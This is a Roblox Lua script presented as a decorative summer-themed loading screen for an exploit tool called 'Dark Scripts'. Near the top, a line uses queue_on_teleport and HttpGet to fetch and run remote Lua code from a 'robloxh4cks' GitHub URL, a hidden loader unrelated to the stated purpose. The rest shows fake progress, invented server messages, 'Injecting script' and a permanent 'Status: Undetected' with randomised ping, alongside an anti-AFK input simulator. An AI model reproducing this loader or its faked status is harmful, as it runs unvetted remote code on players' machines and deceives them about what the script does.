-- Summer Loading Screen for Roblox
-- Place this in StarterGui as a LocalScript

-- ========== CONFIG ==========
local Anti_Afk = true
local Loading_Duration = 10 -- 5 minutes in seconds
local Loading_Title = "🌴 Dark Scripts 🌴" -- Main title text
-- ===========================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

if queue_on_teleport then
    queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/robloxh4cks/load/refs/heads/main/public.lua'))
end

-- Anti-AFK System
if Anti_Afk then
    local VirtualUser = game:GetService("VirtualUser")
    player.Idled:Connect(function()
        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        wait(1)
        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    end)
end

-- Create main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SummerLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 10000
-- Try to put in CoreGui first (higher priority), fallback to PlayerGui
pcall(function() 
    screenGui.Parent = game:GetService("CoreGui") 
end)
if not screenGui.Parent then
    screenGui.Parent = playerGui
end

-- Main frame (full screen)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(135, 206, 250) -- Sky blue
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Background gradient
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)), -- Golden yellow at top
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(135, 206, 250)), -- Sky blue
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 191, 255)) -- Deep blue at bottom
})
gradient.Rotation = 90
gradient.Parent = mainFrame

-- Sun decoration
local sunFrame = Instance.new("Frame")
sunFrame.Name = "Sun"
sunFrame.Size = UDim2.new(0, 120, 0, 120)
sunFrame.Position = UDim2.new(0.8, -60, 0.15, -60)
sunFrame.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
sunFrame.BorderSizePixel = 0
sunFrame.Parent = mainFrame

local sunCorner = Instance.new("UICorner")
sunCorner.CornerRadius = UDim.new(0.5, 0)
sunCorner.Parent = sunFrame

-- Sun rays
for i = 1, 8 do
    local ray = Instance.new("Frame")
    ray.Name = "Ray" .. i
    ray.Size = UDim2.new(0, 6, 0, 40)
    ray.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    ray.BorderSizePixel = 0
    ray.AnchorPoint = Vector2.new(0.5, 1)
    ray.Position = UDim2.new(0.5, 0, 0.5, 0)
    ray.Rotation = (i - 1) * 45
    ray.Parent = sunFrame
    
    local rayCorner = Instance.new("UICorner")
    rayCorner.CornerRadius = UDim.new(0.5, 0)
    rayCorner.Parent = ray
end

-- Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(0, 600, 0, 80)
titleLabel.Position = UDim2.new(0.5, -300, 0.35, -40)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = Loading_Title
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.Cartoon
titleLabel.Parent = mainFrame

-- Title stroke
local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(255, 140, 0)
titleStroke.Thickness = 3
titleStroke.Parent = titleLabel

-- Loading bar background
local loadingBarBg = Instance.new("Frame")
loadingBarBg.Name = "LoadingBarBackground"
loadingBarBg.Size = UDim2.new(0, 500, 0, 40)
loadingBarBg.Position = UDim2.new(0.5, -250, 0.55, -20)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
loadingBarBg.BackgroundTransparency = 0.3
loadingBarBg.BorderSizePixel = 0
loadingBarBg.Parent = mainFrame

local loadingBarCorner = Instance.new("UICorner")
loadingBarCorner.CornerRadius = UDim.new(0, 20)
loadingBarCorner.Parent = loadingBarBg

-- Loading bar fill
local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, -8)
loadingBarFill.Position = UDim2.new(0, 4, 0, 4)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
loadingBarFill.BorderSizePixel = 0
loadingBarFill.Parent = loadingBarBg

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0.5, 0)
fillCorner.Parent = loadingBarFill

-- Loading bar gradient
local fillGradient = Instance.new("UIGradient")
fillGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 140, 0))
})
fillGradient.Parent = loadingBarFill

-- Percentage label
local percentLabel = Instance.new("TextLabel")
percentLabel.Name = "PercentLabel"
percentLabel.Size = UDim2.new(0, 200, 0, 50)
percentLabel.Position = UDim2.new(0.5, -100, 0.62, -25)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.Cartoon
percentLabel.Parent = mainFrame

local percentStroke = Instance.new("UIStroke")
percentStroke.Color = Color3.fromRGB(255, 140, 0)
percentStroke.Thickness = 2
percentStroke.Parent = percentLabel

-- Loading text
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Name = "LoadingLabel"
loadingLabel.Size = UDim2.new(0, 400, 0, 30)
loadingLabel.Position = UDim2.new(0.5, -200, 0.7, -15)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Text = "Loading your summer adventure..."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.TextScaled = true
loadingLabel.Font = Enum.Font.Cartoon
loadingLabel.Parent = mainFrame

-- Loading count label (bottom left)
local loadingCountLabel = Instance.new("TextLabel")
loadingCountLabel.Name = "LoadingCount"
loadingCountLabel.Size = UDim2.new(0, 200, 0, 30)
loadingCountLabel.Position = UDim2.new(0, 20, 1, -50)
loadingCountLabel.BackgroundTransparency = 1
loadingCountLabel.Text = "Loading 0/5000"
loadingCountLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingCountLabel.TextSize = 18
loadingCountLabel.Font = Enum.Font.Cartoon
loadingCountLabel.TextXAlignment = Enum.TextXAlignment.Left
loadingCountLabel.Parent = mainFrame

-- User info container (bottom right)
local userContainer = Instance.new("Frame")
userContainer.Name = "UserContainer"
userContainer.Size = UDim2.new(0, 220, 0, 60)
userContainer.Position = UDim2.new(1, -240, 1, -80)
userContainer.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
userContainer.BackgroundTransparency = 0.3
userContainer.BorderSizePixel = 0
userContainer.Parent = mainFrame

-- Add corner radius to user container
local userCorner = Instance.new("UICorner")
userCorner.CornerRadius = UDim.new(0, 12)
userCorner.Parent = userContainer

-- Add blue gradient to user container
local userGradient = Instance.new("UIGradient")
userGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 130, 180)),  -- Steel blue
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 149, 237)), -- Cornflower blue
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 144, 255))   -- Dodger blue
}
userGradient.Rotation = 45
userGradient.Parent = userContainer

-- "Logged in as:" text
local loggedInLabel = Instance.new("TextLabel")
loggedInLabel.Name = "LoggedInLabel"
loggedInLabel.Size = UDim2.new(1, -70, 0, 20)
loggedInLabel.Position = UDim2.new(0, 10, 0, 8)
loggedInLabel.BackgroundTransparency = 1
loggedInLabel.Text = "Logged in as:"
loggedInLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loggedInLabel.TextSize = 14
loggedInLabel.Font = Enum.Font.Cartoon
loggedInLabel.TextXAlignment = Enum.TextXAlignment.Left
loggedInLabel.Parent = userContainer

-- Username label
local usernameLabel = Instance.new("TextLabel")
usernameLabel.Name = "UsernameLabel"
usernameLabel.Size = UDim2.new(1, -70, 0, 25)
usernameLabel.Position = UDim2.new(0, 10, 0, 28)
usernameLabel.BackgroundTransparency = 1
usernameLabel.Text = player.Name
usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameLabel.TextSize = 16
usernameLabel.Font = Enum.Font.Cartoon
usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
usernameLabel.Parent = userContainer

-- User avatar image
local avatarImage = Instance.new("ImageLabel")
avatarImage.Name = "AvatarImage"
avatarImage.Size = UDim2.new(0, 45, 0, 45)
avatarImage.Position = UDim2.new(1, -55, 0.5, -22.5)
avatarImage.BackgroundTransparency = 1
avatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
avatarImage.Parent = userContainer

-- Add corner radius to avatar
local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(0.5, 0)
avatarCorner.Parent = avatarImage

-- Status info container (top left)
local statusContainer = Instance.new("Frame")
statusContainer.Name = "StatusContainer"
statusContainer.Size = UDim2.new(0, 250, 0, 100)
statusContainer.Position = UDim2.new(0, 20, 0, 20)
statusContainer.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
statusContainer.BackgroundTransparency = 0.3
statusContainer.BorderSizePixel = 0
statusContainer.Parent = mainFrame

-- Add corner radius to container
local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 12)
statusCorner.Parent = statusContainer

-- Add blue gradient to container
local statusGradient = Instance.new("UIGradient")
statusGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 130, 180)),  -- Steel blue
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 149, 237)), -- Cornflower blue
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 144, 255))   -- Dodger blue
}
statusGradient.Rotation = 45
statusGradient.Parent = statusContainer

-- Status info panel (inside container)
local statusPanel = Instance.new("TextLabel")
statusPanel.Name = "StatusPanel"
statusPanel.Size = UDim2.new(1, -20, 1, -20)
statusPanel.Position = UDim2.new(0, 10, 0, 10)
statusPanel.BackgroundTransparency = 1
statusPanel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusPanel.TextSize = 14
statusPanel.Font = Enum.Font.Cartoon
statusPanel.TextXAlignment = Enum.TextXAlignment.Left
statusPanel.TextYAlignment = Enum.TextYAlignment.Top
statusPanel.Parent = statusContainer

-- Get current date
local currentDate = os.date("*t")
local months = {"January", "February", "March", "April", "May", "June", 
               "July", "August", "September", "October", "November", "December"}
local formattedDate = months[currentDate.month] .. " " .. currentDate.day .. ", " .. currentDate.year

-- Set initial status text
statusPanel.Text = "FPS: 60\nMS: 0\nStatus: Undetected\nLast Update: " .. formattedDate

-- Beach decorations
local beachBall = Instance.new("ImageLabel")
beachBall.Name = "BeachBall"
beachBall.Size = UDim2.new(0, 60, 0, 60)
beachBall.Position = UDim2.new(0.1, -30, 0.8, -30)
beachBall.BackgroundTransparency = 1
beachBall.Image = "rbxasset://textures/11288914742" -- You can replace with beach ball image ID
beachBall.Parent = mainFrame

-- Palm tree (text-based)
local palmTree = Instance.new("TextLabel")
palmTree.Name = "PalmTree"
palmTree.Size = UDim2.new(0, 100, 0, 200)
palmTree.Position = UDim2.new(0.05, -50, 0.6, -100)
palmTree.BackgroundTransparency = 1
palmTree.Text = "🌴"
palmTree.TextScaled = true
palmTree.Parent = mainFrame

local palmTree2 = Instance.new("TextLabel")
palmTree2.Name = "PalmTree2"
palmTree2.Size = UDim2.new(0, 80, 0, 160)
palmTree2.Position = UDim2.new(0.92, -40, 0.65, -80)
palmTree2.BackgroundTransparency = 1
palmTree2.Text = "🌴"
palmTree2.TextScaled = true
palmTree2.Parent = mainFrame

-- Floating elements
local cloud1 = Instance.new("TextLabel")
cloud1.Name = "Cloud1"
cloud1.Size = UDim2.new(0, 100, 0, 50)
cloud1.Position = UDim2.new(0.2, -50, 0.15, -25)
cloud1.BackgroundTransparency = 1
cloud1.Text = "☁️"
cloud1.TextScaled = true
cloud1.Parent = mainFrame

local cloud2 = Instance.new("TextLabel")
cloud2.Name = "Cloud2"
cloud2.Size = UDim2.new(0, 80, 0, 40)
cloud2.Position = UDim2.new(0.6, -40, 0.25, -20)
cloud2.BackgroundTransparency = 1
cloud2.Text = "☁️"
cloud2.TextScaled = true
cloud2.Parent = mainFrame

-- Animation variables
local loadingProgress = 0
local startTime = tick()

-- FPS tracking variables
local fps = 60
local lastUpdate = tick()
local frameCount = 0
local ping = 0

-- Loading messages for variety
local loadingMessages = {
    "🔍 Scanning for available servers",
    "🌐 Server found! Attempting to connect",
    "❌ Connection failed: Server is full.",
    "🔁 Searching for another server",
    "🌐 New server located! Connecting",
    "❌ Connection failed: Server at capacity.",
    "🔁 Trying a different server",
    "✅ Connected successfully!",
    "💉 Injecting script. Please wait"
}

-- Sun rotation animation
local sunRotationTween = TweenService:Create(
    sunFrame,
    TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
    {Rotation = 360}
)
sunRotationTween:Play()

-- Cloud floating animations
local cloud1Tween = TweenService:Create(
    cloud1,
    TweenInfo.new(15, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Position = UDim2.new(0.3, -50, 0.18, -25)}
)
cloud1Tween:Play()

local cloud2Tween = TweenService:Create(
    cloud2,
    TweenInfo.new(12, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Position = UDim2.new(0.7, -40, 0.22, -20)}
)
cloud2Tween:Play()

-- Palm tree swaying
local palm1Tween = TweenService:Create(
    palmTree,
    TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Rotation = 5}
)
palm1Tween:Play()

local palm2Tween = TweenService:Create(
    palmTree2,
    TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Rotation = -3}
)
palm2Tween:Play()

-- Loading animation
local messageIndex = 1
local lastMessageTime = 0
local dotAnimationTime = 0
local currentDots = ""

local function updateLoading()
    local elapsed = tick() - startTime
    local progress = math.clamp((elapsed / Loading_Duration) * 100, 0, 100)
    
    if progress < 100 then
        loadingProgress = progress
        
        -- Update progress bar
        local progressWidth = (loadingProgress / 100) * 492 -- 500px - 8px padding
        loadingBarFill.Size = UDim2.new(0, progressWidth, 1, -8)
        
        -- Update percentage text
        percentLabel.Text = math.floor(loadingProgress) .. "%"
        
        -- Update loading count
        local count = math.floor((loadingProgress / 100) * 5000)
        loadingCountLabel.Text = "Loading " .. count .. "/5000"
        
        -- Change loading message every 5 seconds
        if elapsed - lastMessageTime >= 5 and messageIndex <= #loadingMessages then
            messageIndex = messageIndex + 1
            lastMessageTime = elapsed
            dotAnimationTime = 0 -- Reset dot animation
        end
        
        -- Animate dots every 0.5 seconds
        if elapsed - dotAnimationTime >= 0.5 then
            local dotsCount = math.floor(elapsed * 2) % 4 -- 0, 1, 2, 3 dots cycle
            currentDots = string.rep(".", dotsCount)
            dotAnimationTime = elapsed
        end
        
        -- Set current message with animated dots
        local currentMessageIndex = math.min(messageIndex, #loadingMessages)
        local baseMessage = loadingMessages[currentMessageIndex]
        loadingLabel.Text = baseMessage .. currentDots
        
        -- Pulse effect on loading bar every few seconds
        if math.floor(elapsed) % 3 == 0 and elapsed ~= lastMessageTime then
            local pulseTween = TweenService:Create(
                loadingBarFill,
                TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, true),
                {BackgroundColor3 = Color3.fromRGB(255, 255, 100)}
            )
            pulseTween:Play()
        end
    else
        -- Loading complete - stay at 100% without disappearing
        loadingProgress = 100
        percentLabel.Text = "100%"
        
        -- Keep showing the last message with dots animation
        local currentMessageIndex = #loadingMessages -- Always show last message
        local baseMessage = loadingMessages[currentMessageIndex]
        
        -- Continue dot animation even at 100%
        if elapsed - dotAnimationTime >= 0.5 then
            local dotsCount = math.floor(elapsed * 2) % 4
            currentDots = string.rep(".", dotsCount)
            dotAnimationTime = elapsed
        end
        
        loadingLabel.Text = baseMessage .. currentDots
    end
end

-- Press P to close functionality
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.P then
        if screenGui and screenGui.Parent then
            -- Disconnect loading connection
            if loadingConnection then
                loadingConnection:Disconnect()
            end
            
            -- Destroy the GUI
            screenGui:Destroy()
            print("🌴 Summer Paradise Loading Screen closed by user")
        end
    end
end)

-- FPS and status update function
local function updateStatus()
    frameCount = frameCount + 1
    if tick() - lastUpdate >= 1 then
        fps = frameCount
        frameCount = 0
        lastUpdate = tick()
        
        -- Get ping (approximate)
        ping = math.random(5, 50) -- Simulated ping since we can't get real ping easily
        
        -- Update status panel
        statusPanel.Text = "FPS: " .. fps .. "\nMS: " .. ping .. "\nStatus: Undetected\nLast Update: " .. formattedDate
    end
end

-- Start loading animation
local loadingConnection
loadingConnection = RunService.Heartbeat:Connect(function()
    updateLoading()
    updateStatus()
    if loadingProgress >= 100 then
        loadingConnection:Disconnect()
    end
    wait(0.1) -- Control update frequency
end)

-- Print loading info
print("🌴 Summer Paradise Loading Screen started!")
print("📋 Duration: " .. Loading_Duration .. " seconds (" .. Loading_Duration/60 .. " minutes)")
print("🚫 Anti-AFK: " .. (Anti_Afk and "Enabled" or "Disabled"))
print("⌨️ Press P to close the loading screen")
